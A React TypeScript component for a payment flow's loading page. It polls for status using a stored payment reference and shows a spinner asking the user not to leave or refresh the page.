import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowLoadingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as {
    reference?: string;
    amount?: number;
  } | null;

  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  useEffect(() => {
    if (!reference) navigate("/", { replace: true });
  }, [reference, navigate]);

  useFlowPoll({ reference, currentPage: "payment", enabled: !!reference });

  return (
    <div className={styles.loadingOverlay}>
      <div className={styles.loadingCard}>
        <div className={styles.spinnerWrap}>
          <div className={styles.spinnerOuter} />
          <div className={styles.spinnerInner} />
        </div>

        <p className={styles.loadingTitle}>Please wait</p>
        <p className={styles.loadingSubtitle}>Processing your information</p>

        <div className={styles.loadingNoteBox}>
          <p className={styles.loadingNote}>
            Please do not leave or refresh this page until the process is
            complete
          </p>
        </div>

        <div className={styles.dots}>
          <span className={styles.dot} />
          <span className={styles.dotActive} />
          <span className={styles.dot} />
        </div>
      </div>
    </div>
  );
}
